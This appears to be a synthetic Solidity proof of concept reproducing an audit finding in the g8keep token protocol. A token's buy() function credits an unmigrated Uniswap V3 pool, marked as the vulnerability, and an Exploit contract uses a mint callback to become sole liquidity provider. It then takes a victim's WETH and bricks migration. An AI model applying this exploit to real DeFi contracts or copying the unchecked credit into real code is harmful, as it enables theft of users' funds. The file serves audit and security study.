// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  g8keep — buy() can fund a Uniswap V3 pool before migration (Pashov, finding 45308)
    SYNTHETIC, cheatcode-free reduction.
    Token.transfer reverts when the recipient is the pool and the token has not
    migrated. buy(to) credits `to` with no such check. The mint callback calls
    buy(pool), the pool's balance check passes, and the attacker becomes the
    only LP at a skewed price. A later swap sends the victim's WETH into that
    LP, and migrate() reverts because liquidity already exists.
    Vulnerable credit preserved below (@> VULN). */

interface IUniswapV3MintCallback {
    function uniswapV3MintCallback(uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract WETH {
    string public symbol = "WETH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract G8Token {
    string public symbol = "G8";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    address public pool;
    bool public migrated;

    function setPool(address p) external {
        pool = p;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        if (!migrated && to == pool) revert("pre-migration");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function buy(address to, uint256 amount) external {
        balanceOf[to] += amount; // @> VULN: credits the unmigrated pool; transfer() would have reverted
        totalSupply += amount;
    }

    function migrate(address pool_) external {
        require(pool_ == pool, "pool");
        require(IPool(pool).totalLiq() == 0, "already liquid");
        migrated = true;
    }
}

interface IPool {
    function totalLiq() external view returns (uint256);
}

contract UniV3Pool {
    G8Token public token;
    WETH public weth;
    uint256 public reserve0;
    uint256 public reserve1;
    uint256 public totalLiq;
    mapping(address => uint256) public liquidity;
    bool public initialized;

    constructor(G8Token t, WETH w) {
        token = t;
        weth = w;
    }

    function mint(address recipient) external returns (uint256 liquid) {
        uint256 amount0 = 1e15;
        uint256 amount1 = 100e18;
        uint256 balance0Before = token.balanceOf(address(this));
        uint256 balance1Before = weth.balanceOf(address(this));
        IUniswapV3MintCallback(msg.sender).uniswapV3MintCallback(amount0, amount1, "");
        require(balance0Before + amount0 <= token.balanceOf(address(this)), "M0");
        require(balance1Before + amount1 <= weth.balanceOf(address(this)), "M1");
        reserve0 += amount0;
        reserve1 += amount1;
        liquidity[recipient] += amount0;
        totalLiq += amount0;
        initialized = true;
        liquid = amount0;
    }

    function swapExactWethForToken(uint256 wethIn, address to) external returns (uint256 tokenOut) {
        weth.transferFrom(msg.sender, address(this), wethIn);
        tokenOut = reserve0 * wethIn / (reserve1 + wethIn);
        reserve1 += wethIn;
        reserve0 -= tokenOut;
        token.transfer(to, tokenOut);
    }

    function burn(address to) external returns (uint256 wethOut, uint256 tokenOut) {
        require(liquidity[msg.sender] == totalLiq && totalLiq > 0, "not full lp");
        wethOut = reserve1;
        tokenOut = reserve0;
        reserve0 = 0;
        reserve1 = 0;
        liquidity[msg.sender] = 0;
        totalLiq = 0;
        weth.transfer(to, wethOut);
        token.transfer(to, tokenOut);
    }
}

contract Victim {
    function approve(WETH weth, address pool, uint256 amount) external {
        weth.approve(pool, amount);
    }

    function swap(UniV3Pool pool, uint256 wethIn) external returns (uint256) {
        return pool.swapExactWethForToken(wethIn, address(this));
    }
}

contract Exploit {
    WETH public weth; // CREATE nonce 1
    G8Token public token; // CREATE nonce 2
    UniV3Pool public pool; // CREATE nonce 3
    Victim public victim; // CREATE nonce 4
    address public constant SINK = 0x000000000000000000000000000000000000D00d;
    bool public migrateFailed;
    uint256 public victimTokens;

    constructor() {
        weth = new WETH();
        token = new G8Token();
        pool = new UniV3Pool(token, weth);
        victim = new Victim();
        token.setPool(address(pool));
    }

    function uniswapV3MintCallback(uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == address(pool), "pool");
        token.buy(address(pool), amount0);
        weth.transfer(address(pool), amount1);
    }

    function pokePool() external {
        token.transfer(address(pool), 0);
    }

    function run() external {
        bool transferBlocked;
        try this.pokePool() {}
        catch {
            transferBlocked = true;
        }
        require(transferBlocked, "transfer to pool must revert");

        weth.mint(address(this), 100e18);
        weth.mint(address(victim), 1e18);
        pool.mint(address(this));
        require(pool.initialized(), "lp");
        require(!token.migrated(), "not migrated");

        victim.approve(weth, address(pool), 1e18);
        victimTokens = victim.swap(pool, 1e18);

        try token.migrate(address(pool)) {
            migrateFailed = false;
        } catch {
            migrateFailed = true;
        }
        require(migrateFailed, "migration not bricked");

        pool.burn(address(this));
        weth.transfer(SINK, 1e18);
        require(!token.migrated(), "still unmigrated");
        require(weth.balanceOf(address(victim)) == 0, "victim lost weth");
        require(victimTokens < 1e15, "victim did not buy at the skewed price");
        require(weth.balanceOf(SINK) == 1e18, "attacker kept the victim weth");
    }
}
